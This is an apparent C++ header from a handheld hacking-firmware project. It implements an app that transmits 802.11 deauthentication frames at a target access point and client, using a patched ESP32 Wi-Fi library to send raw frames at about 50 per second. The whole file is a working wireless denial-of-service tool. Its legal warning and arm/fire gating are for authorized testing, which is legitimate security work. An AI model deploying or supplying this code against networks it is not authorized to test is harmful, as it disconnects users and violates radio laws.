#pragma once
// WifiNativeDeauthApp — TX 802.11 deauth frames directly from the
// Cardputer's onboard radio. Uses IWifiMonitor::tx_raw.
//
// LEGAL: TXing deauth frames against networks you do not own /
// do not have written authorization to test is a violation of
// FCC Part 15 in the US and equivalent laws in most other
// jurisdictions. Yui ships this DISARMED — the user must Tab to
// arm and Fn+Enter to fire, and the app surfaces a stark legal
// warning on every render.
//
// The ESP32 backend uses the patched-libnet80211 path (zmuldefs
// override of ieee80211_freedom_output) — this is the same hack
// Bruce / ESP32-Marauder use. It is fragile across ESP-IDF
// upgrades; if a future IDF refresh breaks it, the user will
// see "tx_raw returned false" and the app will land in Failed.
#include "yui/app/App.hpp"
#include "yui/hal/IWifiMonitor.hpp"
#include "yui/proto/Dot11.hpp"
#include "yui/types.hpp"
#include <cstdio>
#include <cstring>

#include "yui/ui/Chrome.hpp"
#include "yui/ui/Tokens.hpp"
namespace yui {

class WifiNativeDeauthApp : public App {
public:
  static constexpr uint32_t kPerFrameMs = 20;   // ~50 frames/sec/target

  WifiNativeDeauthApp(IWifiMonitor& mon) : mon_(mon) {}

  const char* name() const override { return "Deauth!"; }
  Category    category() const override { return Category::WiFi; }

  void on_enter(Hal& hal) override {
    hal_         = &hal;
    armed_       = false;
    firing_      = false;
    tx_total_    = 0;
    last_tx_ms_  = 0;
    last_failure_ = false;
    std::strncpy(bssid_str_, "00:00:00:00:00:00", sizeof(bssid_str_));
    std::strncpy(client_str_, "FF:FF:FF:FF:FF:FF", sizeof(client_str_));
    WifiFilter f{}; f.mgmt = false; f.data = false; f.ctrl = false;  // TX-only
    mon_.start(f, channel_);
  }

  void on_exit() override { firing_ = false; mon_.stop(); }

  void on_key(KeyEvent k) override {
    if (!k.down) return;
    if (k.key == Key::Tab) armed_ = !armed_;
    if (k.key == Key::Up   && channel_ < 13) { ++channel_; mon_.set_channel(channel_); }
    if (k.key == Key::Down && channel_ > 1)  { --channel_; mon_.set_channel(channel_); }
    if (k.key == Key::Enter && k.fn && armed_) firing_ = !firing_;
  }

  void tick(uint32_t now_ms) override {
    if (!firing_) return;
    if (now_ms - last_tx_ms_ < kPerFrameMs && last_tx_ms_ != 0) return;
    last_tx_ms_ = now_ms == 0 ? 1 : now_ms;
    uint8_t bssid[6], client[6];
    if (!dot11::parse_mac(bssid_str_,  bssid))  { firing_ = false; return; }
    if (!dot11::parse_mac(client_str_, client)) { firing_ = false; return; }
    uint8_t frame[64];
    const size_t n = dot11::build_deauth(frame, sizeof(frame), client, bssid);
    if (n == 0 || !mon_.tx_raw(frame, n)) {
      last_failure_ = true;
      firing_       = false;
      return;
    }
    ++tx_total_;
  }

  void render(IDisplay& d) override {
    d.clear(ui::kSurface);
    ui::Chrome::header(d, "Deauth (native)");

    char line[40];
    int y = 22;
    std::snprintf(line, sizeof(line), "Tgt:  %s", bssid_str_);
    d.draw_text(8, y, line, ui::kOnSurface, ui::kSurface); y += 13;
    std::snprintf(line, sizeof(line), "Sta:  %s", client_str_);
    d.draw_text(8, y, line, ui::kOnSurface, ui::kSurface); y += 13;
    std::snprintf(line, sizeof(line), "Ch: %u   Sent: %u",
                  static_cast<unsigned>(channel_),
                  static_cast<unsigned>(tx_total_));
    d.draw_text(8, y, line, ui::kOnSurface, ui::kSurface); y += 13;
    std::snprintf(line, sizeof(line), "Armed:%s  Firing:%s",
                  armed_ ? "Y" : "n", firing_ ? "YES" : "no");
    d.draw_text(8, y, line, firing_ ? kJapanRedBright : ui::kAccentDark, ui::kSurface);
    y += 13;
    if (last_failure_)
      d.draw_text(8, y, "TX failed (libnet?)", kJapanRedBright, ui::kSurface);

    ui::Chrome::footer(d, "Tab:arm Fn+Enter:fire OWN NET ONLY");
    d.flush();
  }

  // Configuration / test hooks
  void set_target(const char* bssid, const char* client) {
    std::strncpy(bssid_str_,  bssid  ? bssid  : "00:00:00:00:00:00",
                 sizeof(bssid_str_) - 1);
    std::strncpy(client_str_, client ? client : "FF:FF:FF:FF:FF:FF",
                 sizeof(client_str_) - 1);
    bssid_str_[sizeof(bssid_str_) - 1]   = '\0';
    client_str_[sizeof(client_str_) - 1] = '\0';
  }
  void set_channel(uint8_t ch) { channel_ = ch; mon_.set_channel(ch); }
  bool   armed()        const { return armed_; }
  bool   firing()       const { return firing_; }
  size_t tx_total()     const { return tx_total_; }
  bool   last_failure() const { return last_failure_; }
  uint8_t channel()     const { return channel_; }

private:
  IWifiMonitor& mon_;
  Hal*          hal_           = nullptr;
  uint8_t       channel_       = 6;
  bool          armed_         = false;
  bool          firing_        = false;
  bool          last_failure_  = false;
  size_t        tx_total_      = 0;
  uint32_t      last_tx_ms_    = 0;
  char          bssid_str_[18]  = {0};
  char          client_str_[18] = {0};
};

}  // namespace yui
